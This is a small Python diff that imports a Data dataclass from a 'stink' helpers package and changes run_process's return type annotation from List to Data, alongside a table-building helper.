@@ -1,5 +1,7 @@
 from typing import List, Any, Tuple
 
+from stink.helpers.dataclasses import Data
+
 
 def create_table(header: List[Any], rows: List[Any]) -> str:
     """
@@ -27,7 +29,7 @@ def create_table(header: List[Any], rows: List[Any]) -> str:
         yield horizontal_border
 
 
-def run_process(process: Any, arguments: Tuple = None) -> List:
+def run_process(process: Any, arguments: Tuple = None) -> Data:
     """
     Starts the process.
 
